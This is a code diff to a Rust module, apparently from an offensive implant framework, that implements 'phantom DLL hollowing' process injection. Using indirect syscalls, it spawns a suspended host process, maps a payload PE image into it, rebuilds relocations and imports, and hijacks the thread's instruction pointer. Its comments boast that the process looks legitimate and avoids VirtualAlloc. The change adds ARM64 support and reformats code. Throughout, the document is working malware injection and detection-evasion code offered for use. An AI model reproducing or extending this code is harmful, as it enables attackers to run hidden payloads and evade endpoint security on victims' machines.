@@ -15,8 +15,8 @@
 //!    original image base.  Fix base relocations, rebuild IAT, update
 //!    `PEB.ImageBaseAddress`.
 //!
-//! 4. **Execution** — Set thread `CONTEXT.Rip` to the payload entry point and
-//!    `NtResumeThread`.
+//! 4. **Execution** — Set the thread context instruction pointer to the payload
+//!    entry point and `NtResumeThread`.
 //!
 //! The resulting process appears completely legitimate: the host binary exists
 //! on disk, the PEB is consistent, and no `VirtualAlloc`/`VirtualAllocEx` was
@@ -25,20 +25,24 @@
 //!
 //! # Constraints
 //!
-//! - Windows x86_64 only.
+//! - Windows x86_64 and ARM64.
 //! - Requires `direct-syscalls` feature for indirect syscall infrastructure.
-//! - Payload must be a valid PE64 image with a relocation table.
+//! - Payload must be a valid PE64 image with a relocation table and a machine
+//!   type matching the agent architecture.
 
-#![cfg(all(windows, feature = "phantom-dll-hollow", target_arch = "x86_64"))]
+#![cfg(all(
+    windows,
+    feature = "phantom-dll-hollow",
+    any(target_arch = "x86_64", target_arch = "aarch64")
+))]
 
 use anyhow::{anyhow, Result};
 use winapi::ctypes::c_void;
 use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 use winapi::um::winnt::{
-    CONTEXT, CONTEXT_FULL, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER,
-    IMAGE_NT_HEADERS64, IMAGE_NT_OPTIONAL_HDR64_MAGIC, IMAGE_NT_SIGNATURE,
-    IMAGE_SECTION_HEADER, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
-    PAGE_READONLY, PAGE_READWRITE, SEC_COMMIT,
+    CONTEXT, CONTEXT_FULL, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64,
+    IMAGE_NT_OPTIONAL_HDR64_MAGIC, IMAGE_NT_SIGNATURE, IMAGE_SECTION_HEADER, PAGE_EXECUTE_READ,
+    PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, SEC_COMMIT,
 };
 
 // ── NT constants (not exported by winapi) ────────────────────────────────────
@@ -57,6 +61,25 @@ const NT_FILE_SHARE_DELETE: u32 = 0x0004;
 const NT_FILE_SYNC_IO_NONALERT: u32 = 0x0000_0020;
 const NT_FILE_NON_DIRECTORY: u32 = 0x0000_0040;
 const NT_SEC_IMAGE: u32 = 0x0100_0000;
+#[cfg(target_arch = "x86_64")]
+const EXPECTED_PE_MACHINE: u16 = 0x8664;
+#[cfg(target_arch = "aarch64")]
+const EXPECTED_PE_MACHINE: u16 = 0xAA64;
+
+#[cfg(target_arch = "x86_64")]
+const CONTEXT_IP_NAME: &str = "RIP";
+#[cfg(target_arch = "aarch64")]
+const CONTEXT_IP_NAME: &str = "PC";
+
+#[cfg(target_arch = "x86_64")]
+fn set_context_instruction_pointer(ctx: &mut CONTEXT, value: u64) {
+    ctx.Rip = value;
+}
+
+#[cfg(target_arch = "aarch64")]
+fn set_context_instruction_pointer(ctx: &mut CONTEXT, value: u64) {
+    ctx.Pc = value;
+}
 
 // ── Result type ──────────────────────────────────────────────────────────────
 
@@ -146,9 +169,7 @@ macro_rules! close_handle {
 /// then creates the initial thread suspended via `NtCreateThreadEx`.
 ///
 /// Returns `(h_process, h_thread)`.
-unsafe fn create_suspended_process_nt(
-    exe_path: &str,
-) -> Result<(*mut c_void, *mut c_void)> {
+unsafe fn create_suspended_process_nt(exe_path: &str) -> Result<(*mut c_void, *mut c_void)> {
     // Build NT namespace path and UNICODE_STRING.
     let mut path_wide = dos_to_nt_path(exe_path);
     let byte_len = ((path_wide.len() - 1) * 2) as u16;
@@ -364,9 +385,7 @@ unsafe fn apply_relocations_remote(
             if entry_off + 2 > reloc_end {
                 break;
             }
-            let entry = u16::from_le_bytes(
-                payload[entry_off..entry_off + 2].try_into().unwrap(),
-            );
+            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
             let typ = (entry >> 12) & 0xF;
             let off = (entry & 0x0FFF) as usize;
 
@@ -478,16 +497,27 @@ unsafe fn fix_iat_remote(
         }
 
         // Read descriptor fields from the local payload.
-        let ilt_rva =
-            u32::from_le_bytes(payload[desc_offset..desc_offset + 4].try_into().unwrap());
-        let _timestamp =
-            u32::from_le_bytes(payload[desc_offset + 4..desc_offset + 8].try_into().unwrap());
-        let _forwarder =
-            u32::from_le_bytes(payload[desc_offset + 8..desc_offset + 12].try_into().unwrap());
-        let name_rva =
-            u32::from_le_bytes(payload[desc_offset + 12..desc_offset + 16].try_into().unwrap());
-        let iat_rva =
-            u32::from_le_bytes(payload[desc_offset + 16..desc_offset + 20].try_into().unwrap());
+        let ilt_rva = u32::from_le_bytes(payload[desc_offset..desc_offset + 4].try_into().unwrap());
+        let _timestamp = u32::from_le_bytes(
+            payload[desc_offset + 4..desc_offset + 8]
+                .try_into()
+                .unwrap(),
+        );
+        let _forwarder = u32::from_le_bytes(
+            payload[desc_offset + 8..desc_offset + 12]
+                .try_into()
+                .unwrap(),
+        );
+        let name_rva = u32::from_le_bytes(
+            payload[desc_offset + 12..desc_offset + 16]
+                .try_into()
+                .unwrap(),
+        );
+        let iat_rva = u32::from_le_bytes(
+            payload[desc_offset + 16..desc_offset + 20]
+                .try_into()
+                .unwrap(),
+        );
 
         // Terminating descriptor: all zeros.
         if ilt_rva == 0 && name_rva == 0 && iat_rva == 0 {
@@ -510,8 +540,8 @@ unsafe fn fix_iat_remote(
             desc_idx += 1;
             continue;
         }
-        let dll_name =
-            std::ffi::CStr::from_bytes_with_nul(&payload[name_offset..=name_end]).unwrap_or_else(|_| {
+        let dll_name = std::ffi::CStr::from_bytes_with_nul(&payload[name_offset..=name_end])
+            .unwrap_or_else(|_| {
                 desc_idx += 1;
                 std::ffi::CStr::from_bytes_with_nul(b"?\0").unwrap()
             });
@@ -552,9 +582,8 @@ unsafe fn fix_iat_remote(
             if thunk_offset + 8 > payload.len() {
                 break;
             }
-            let thunk_val = u64::from_le_bytes(
-                payload[thunk_offset..thunk_offset + 8].try_into().unwrap(),
-            );
+            let thunk_val =
+                u64::from_le_bytes(payload[thunk_offset..thunk_offset + 8].try_into().unwrap());
 
             // Terminating entry.
             if thunk_val == 0 {
@@ -593,12 +622,7 @@ unsafe fn fix_iat_remote(
             if let Some(addr) = func_addr {
                 // Patch the IAT entry in the remote process.
                 let iat_slot = remote_base + iat_rva as usize + thunk_idx as usize * 8;
-                if !nt_write_exact(
-                    h_process,
-                    iat_slot,
-                    &addr as *const _ as *const c_void,
-                    8,
-                ) {
+                if !nt_write_exact(h_process, iat_slot, &addr as *const _ as *const c_void, 8) {
                     tracing::warn!(
                         "phantom_dll_hollow: failed to write IAT slot at {:#x}",
                         iat_slot
@@ -631,8 +655,8 @@ unsafe fn apply_section_protections(
     nt: *const IMAGE_NT_HEADERS64,
 ) {
     let num_sections = (*nt).FileHeader.NumberOfSections as usize;
-    let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
-        as *const IMAGE_SECTION_HEADER;
+    let first_section =
+        (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
 
     for i in 0..num_sections {
         let sec = &*first_section.add(i);
@@ -696,25 +720,28 @@ fn rva_to_file_offset(payload: &[u8], rva: usize) -> usize {
     if e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>() > payload.len() {
         return rva;
     }
-    let num_sections =
-        u16::from_le_bytes(payload[e_lfanew + 6..e_lfanew + 8].try_into().unwrap_or([0, 0]));
-    let size_of_opt_header = unsafe {
-        (payload.as_ptr().add(e_lfanew + 4 + 16) as *const u16).read_unaligned()
-    } as usize;
-    let sections_offset = e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>()
-        + size_of_opt_header;
+    let num_sections = u16::from_le_bytes(
+        payload[e_lfanew + 6..e_lfanew + 8]
+            .try_into()
+            .unwrap_or([0, 0]),
+    );
+    let size_of_opt_header =
+        unsafe { (payload.as_ptr().add(e_lfanew + 4 + 16) as *const u16).read_unaligned() }
+            as usize;
+    let sections_offset =
+        e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>() + size_of_opt_header;
 
     for i in 0..num_sections as usize {
         let off = sections_offset + i * std::mem::size_of::<IMAGE_SECTION_HEADER>();
         if off + std::mem::size_of::<IMAGE_SECTION_HEADER>() > payload.len() {
             break;
         }
-        let va = u32::from_le_bytes(payload[off + 12..off + 16].try_into().unwrap_or([0; 4]))
-            as usize;
-        let vs = u32::from_le_bytes(payload[off + 8..off + 12].try_into().unwrap_or([0; 4]))
-            as usize;
-        let raw = u32::from_le_bytes(payload[off + 20..off + 24].try_into().unwrap_or([0; 4]))
-            as usize;
+        let va =
+            u32::from_le_bytes(payload[off + 12..off + 16].try_into().unwrap_or([0; 4])) as usize;
+        let vs =
+            u32::from_le_bytes(payload[off + 8..off + 12].try_into().unwrap_or([0; 4])) as usize;
+        let raw =
+            u32::from_le_bytes(payload[off + 20..off + 24].try_into().unwrap_or([0; 4])) as usize;
 
         if rva >= va && rva < va + vs {
             return rva - va + raw;
@@ -768,6 +795,13 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
             "phantom_dll_hollow: only PE64 payloads are supported"
         ));
     }
+    if (*nt).FileHeader.Machine != EXPECTED_PE_MACHINE {
+        return Err(anyhow!(
+            "phantom_dll_hollow: PE machine {:#06x} does not match this agent ({:#06x})",
+            (*nt).FileHeader.Machine,
+            EXPECTED_PE_MACHINE
+        ));
+    }
 
     let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
     let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
@@ -791,11 +825,11 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         "NtCreateSection",
         &mut h_section as *mut _ as u64,
         NT_SECTION_ALL_ACCESS as u64,
-        0u64,                                        // no object attributes
-        &mut section_size as *mut _ as u64,          // maximum size
-        PAGE_EXECUTE_READWRITE as u64,               // section page protection
-        SEC_COMMIT as u64,                           // allocation attributes (no file)
-        0u64,                                        // no file handle
+        0u64,                               // no object attributes
+        &mut section_size as *mut _ as u64, // maximum size
+        PAGE_EXECUTE_READWRITE as u64,      // section page protection
+        SEC_COMMIT as u64,                  // allocation attributes (no file)
+        0u64,                               // no file handle
     )
     .map_err(|e| anyhow!("phantom_dll_hollow: NtCreateSection SSN: {e}"))?;
     if s < 0 || h_section.is_null() {
@@ -811,15 +845,15 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
     let s = crate::syscall!(
         "NtMapViewOfSection",
         h_section as u64,
-        NT_CURRENT_PROCESS as u64,                   // into our process
+        NT_CURRENT_PROCESS as u64, // into our process
         &mut local_base as *mut _ as u64,
-        0u64,                                        // zero bits
-        0u64,                                        // commit size
-        std::ptr::null_mut::<u64>() as u64,            // section offset (NULL = start)
+        0u64,                               // zero bits
+        0u64,                               // commit size
+        std::ptr::null_mut::<u64>() as u64, // section offset (NULL = start)
         &mut view_size as *mut _ as u64,
-        1u64,                                        // ViewUnmap = 1 (not inherited)
-        0u64,                                        // allocation type
-        PAGE_READWRITE as u64,                       // protection for local view
+        1u64,                  // ViewUnmap = 1 (not inherited)
+        0u64,                  // allocation type
+        PAGE_READWRITE as u64, // protection for local view
     )
     .map_err(|e| anyhow!("phantom_dll_hollow: NtMapViewOfSection(local) SSN: {e}"))?;
     if s < 0 || local_base.is_null() {
@@ -851,8 +885,8 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
 
     // Copy each section from file offsets to virtual addresses.
     let num_sections = (*nt).FileHeader.NumberOfSections as usize;
-    let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
-        as *const IMAGE_SECTION_HEADER;
+    let first_section =
+        (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
     for i in 0..num_sections {
         let sec = &*first_section.add(i);
         let raw_off = sec.PointerToRawData as usize;
@@ -887,9 +921,8 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
     //
     // Try multiple host candidates; fall through on failure.
     let (h_process, h_thread, _host_path) = {
-        let mut result: Result<(*mut c_void, *mut c_void)> = Err(anyhow!(
-            "phantom_dll_hollow: all host candidates failed"
-        ));
+        let mut result: Result<(*mut c_void, *mut c_void)> =
+            Err(anyhow!("phantom_dll_hollow: all host candidates failed"));
         let mut chosen_path = String::new();
         for path in host_candidate_paths() {
             match create_suspended_process_nt(&path) {
@@ -1116,7 +1149,12 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
     match get_ctx {
         Ok(st) if st >= 0 => {
             let entry_point = (remote_base_usize + entry_point_rva) as u64;
-            ctx.Rip = entry_point;
+            set_context_instruction_pointer(&mut ctx, entry_point);
+            tracing::debug!(
+                "phantom_dll_hollow: setting thread {} to {:#x}",
+                CONTEXT_IP_NAME,
+                entry_point,
+            );
 
             let set_ctx = crate::syscall!(
                 "NtSetContextThread",
@@ -1206,7 +1244,7 @@ mod tests {
         buf[0x80..0x84].copy_from_slice(b"PE\0\0");
         // Machine at 0x84 (IMAGE_FILE_HEADER +0)
         buf[0x84..0x86].copy_from_slice(&(0x8664u16).to_le_bytes()); // IMAGE_FILE_MACHINE_AMD64
-        // NumberOfSections at 0x86
+                                                                     // NumberOfSections at 0x86
         buf[0x86..0x88].copy_from_slice(&(1u16).to_le_bytes());
         // SizeOfOptionalHeader at 0x94
         let opt_header_size = std::mem::size_of::<winapi::um::winnt::IMAGE_OPTIONAL_HEADER64>();
@@ -1216,7 +1254,8 @@ mod tests {
 
         // Section header starts after OptionalHeader.
         let section_offset = 0x80 + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>() + opt_header_size;
-        let sec = &mut buf[section_offset..section_offset + std::mem::size_of::<IMAGE_SECTION_HEADER>()];
+        let sec =
+            &mut buf[section_offset..section_offset + std::mem::size_of::<IMAGE_SECTION_HEADER>()];
         // VirtualAddress at +12
         let va: u32 = 0x1000;
         sec[12..16].copy_from_slice(&va.to_le_bytes());
